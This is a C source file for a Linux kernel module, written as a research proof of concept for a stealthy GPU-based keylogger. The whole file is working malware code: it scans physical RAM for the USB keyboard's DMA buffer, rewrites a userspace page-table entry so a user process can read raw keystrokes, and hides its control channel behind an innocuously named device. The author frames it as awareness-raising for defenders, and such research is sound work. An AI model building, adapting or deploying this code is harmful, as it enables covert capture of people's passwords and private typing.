// 
// Kernel module to remap one userspace-accessible address to map the
// USB keyboard DMA buffer and another userspace-accessible address to
// map the 'jiffies_64' kernel variable.  For USB DMA buffer
// discovery, implements a RAM carving approach to find the keyboard
// buffer on Linux, based on the sketch provided in "You Can Type, but
// You Can’t Hide: A Stealthy GPU-based Keylogger", by Ladakis et al.
//
// Written by Golden G. Richard III (@nolaforensix), 7/2014 - 1/2015.
//
// Copyright (c) 2014-5 by Golden G. Richard III. 
//
// Many thanks to Andrew Case (@attrc) for useful discussions.
//
// The license, and specifically the BSD disclaimer, is necessary
// because you can bad stuff with this code.  Don't.  My intention
// is to raise awareness of GPU-based malware (and other esoteric
// malware) and encourage the development of appropriate defensive and
// analysis tools. I strongly encourage you to also work tirelessly
// toward that end, instead.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
// notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above
// copyright notice, this list of conditions and the following
// disclaimer in the documentation and/or other materials provided
// with the distribution.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
//"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//

#include <linux/usb.h>
#include <linux/ioport.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/delay.h>
#include <linux/ptrace.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/miscdevice.h>
#include <linux/jiffies.h>
#include <linux/kallsyms.h>
#include <asm/atomic.h>
#include <asm/pgtable.h>

#define RAMSTR "System RAM"
#undef DEBUG

#ifdef DEBUG
#define DBG(fmt, args...) do { printk("[Scan] "fmt"\n", ## args); } while (0)
#else
#define DBG(fmt, args...) do {} while(0)
#endif

extern struct resource iomem_resource;

// Flushes TLB entry for a specific page
static void tlb_flush_page(void *addr) {
  __asm__ __volatile__("invlpg %0;"
                       :
                       :"m"(addr)
                       : "memory");
}

// Flush TLB on all CPUs
static void tlb_flush_page_all_cpus(void *addr) {
  on_each_cpu(tlb_flush_page, addr, 1);
}

// Callback to examine one PTE entry via walk_page_range
static int examine_pte_entry(pte_t *pte, 
			     unsigned long start, 
			     unsigned long end, 
			     struct mm_walk *walk) {
  DBG("PTE: start: %lx end: %lx pte: %lx", start, end, *(unsigned long *)pte);
  walk->private = pte;
  return 0;
}

struct mm_walk walk = {
  .pte_entry = examine_pte_entry,
  .private = 0
};

// keylog device functions for communicating briefly with userspace,
// to retrieve virtual address to remap
static ssize_t kl_write(struct file *file, const char __user *buf,
			   size_t size, loff_t *off) {

  static int calls=0;
  struct resource *res;
  void *i, *j, *v;
  unsigned long is, physaddr=0;
  struct page *p;
  struct urb *urbp;
  unsigned long *useraddr=0;
  pte_t *userpteptr;
  int (*walk_page_range)(unsigned long addr, 
			 unsigned long end,
			 struct mm_walk *walk);

  if (size == sizeof(unsigned long)) {
    useraddr = kzalloc(size, GFP_KERNEL);
    DBG("Receiving in kl_write()\n");
    copy_from_user(useraddr, buf, size);
    DBG("kl_write got %lx\n", *useraddr);

     //struct mm_walk {
     //      int (*pgd_entry)(pgd_t *, unsigned long, unsigned long, struct mm_walk *);
     //      int (*pud_entry)(pud_t *, unsigned long, unsigned long, struct mm_walk *);
     //      int (*pmd_entry)(pmd_t *, unsigned long, unsigned long, struct mm_walk *);
     //      int (*pte_entry)(pte_t *, unsigned long, unsigned long, struct mm_walk *);
     //      int (*pte_hole)(unsigned long, unsigned long, struct mm_walk *);
     //      int (*hugetlb_entry)(pte_t *, unsigned long, unsigned long,
     //		struct mm_walk *);
     //      struct mm_struct *mm;
     //      void *private;
     //    };

     walk.mm = current->mm;

     // walk_page_range() not exported to modules--look up address
     walk_page_range = (int (*)(unsigned long addr, 
				unsigned long end,
				struct mm_walk *walk))kallsyms_lookup_name("walk_page_range");
     walk_page_range((*useraddr), (*useraddr)+4096, &walk);  

     // now walk.private contains PTE for virtual address provided by
     // userspace--save it. 
     userpteptr = (pte_t *)walk.private;

     // first write() call from userspace maps USB keyboard DMA
     // address, second maps jiffies_64.  Yes, it's a horrible hack.
     // That's typical of malware. Return value for write() is the
     // offset into the mapped page of the variable of interest.  For
     // the USB DMA buffer, which is page-aligned, this isn't useful,
     // but it's essential for "covertly" getting the correct location
     // for jiffies_64 from userspace.

     calls++;

     if (calls == 1) {
       // Find USB keyboard DMA address 
       DBG("Searching for DMA address...");
       for (res = iomem_resource.child; res ; res = res->sibling) {
	 if (! strncmp(res->name, RAMSTR, sizeof(RAMSTR))) {
	   for (i = (void *)res->start; i < (void *)res->end; i += PAGE_SIZE) {
	     is = min(PAGE_SIZE, ((unsigned long)res->end - (unsigned long)i + 1));
	     if (is == PAGE_SIZE) {
	       p = pfn_to_page(((unsigned long)i) >> PAGE_SHIFT);
	       v=kmap(p);
	       if (v) {
		 for (j = v; j < v + PAGE_SIZE - sizeof(struct urb); j++) {
		   urbp = (struct urb *)j;
		   if (
		       ((unsigned long)urbp->dev) % 0x400 == 0 &&
		       __virt_addr_valid((unsigned long)urbp->dev) &&
		       ((unsigned long)urbp->transfer_dma) % 0x20 == 0 &&
		       urbp->transfer_buffer_length == 8 &&
		       __virt_addr_valid((unsigned long)urbp->dev->product) &&
		       (strnstr(urbp->dev->product, "Keyboard", 32) ||
			strnstr(urbp->dev->product, "keyboard", 32))
		       ) {
		     physaddr = urbp->transfer_dma;
		     // BUG:  assumes first matching URB is the right one; on some
		     // machines, there may be multiple matches.  Commenting out
		     // the kunmap() and goto below will choose the last match.
		     //		  kunmap(p);
		     //		  goto almostdone;
		   }
		 }
	       }
	       kunmap(p);
	     }
	   }
	 }
       }
       
     almostdone:
       if (! physaddr) {
	 DBG("DMA address not found.");
       }
       else {
	 DBG("DMA address is %lx", physaddr);
       }
     }
     else {
       // map jiffies_64
       physaddr=virt_to_phys(&jiffies_64);
       DBG("jiffies_64 physical address is %lx", physaddr);
     }

     if (physaddr) {
       DBG("Remapping userspace virtual address %lx with PTE %lx to address %lx", 
	   *useraddr, *((unsigned long *)walk.private), physaddr);
       // wipe page frame number bits
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       *((unsigned long *)userpteptr) &= ~(0xFFFFFFFFFF000);
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       // modify frame number
       *((unsigned long *)userpteptr) |= (physaddr & ~(0xFFF));
       DBG("PTE: %lx", *((unsigned long *)userpteptr));

       /*
       // fix up flags
       (*((unsigned long *)userpteptr)) |= 0x1;        // set present
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       */
       
       (*((unsigned long *)userpteptr)) |= 0x10;       // set cache disabled
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       
       /*
       (*((unsigned long *)userpteptr)) |= 0x20;       // set accessed
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       
       //       (*((unsigned long *)userpteptr)) &= ~(1 << 2);  // clear R/W
       //             DBG("PTE: %lx", *((unsigned long *)userpteptr));
       
       (*((unsigned long *)userpteptr)) &= ~(1 << 4);  // clear user
       DBG("PTE: %lx", *((unsigned long *)userpteptr));
       
       (*((unsigned long *)userpteptr)) &= ~(1 << 6);  // clear dirty
       DBG("PTE: %lx", *((unsigned long *)userpteptr));

       p=pte_page(*userpteptr);
       atomic_add(2, &(p->_count));
       atomic_add(2, &(p->_mapcount));
       */

       // flush TLB entries on all CPUs for remapped page
       tlb_flush_page_all_cpus((void *)(*useraddr));
       DBG("TLBs Flushed.");
       DBG("Done.");

     }
  }
  else {
    DBG("Sorry.");
  }
  
  if (useraddr) {
    kfree(useraddr);
  }
  
  return physaddr & 0xFFF;      // return offset into page
}


// device  for communicating briefly with userspace
static struct file_operations kl_fops = {
  .owner = THIS_MODULE,
  .write = kl_write,
  .llseek = noop_llseek
};

static struct miscdevice kl_misc_device = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "sde",
  .fops = &kl_fops
};


int init_module() {

  // register device so userspace can communicate and provide virtual
  // address of buffer to map to USB keyboard buffer and map
  // jiffies_64
  misc_register(&kl_misc_device);

  // allow module to remain loaded for now--userspace component
  // will unload
  return 0;
}


void cleanup_module(void) {

  // get rid of the /dev/ device
  misc_deregister(&kl_misc_device);
  
}
MODULE_LICENSE("GPL");
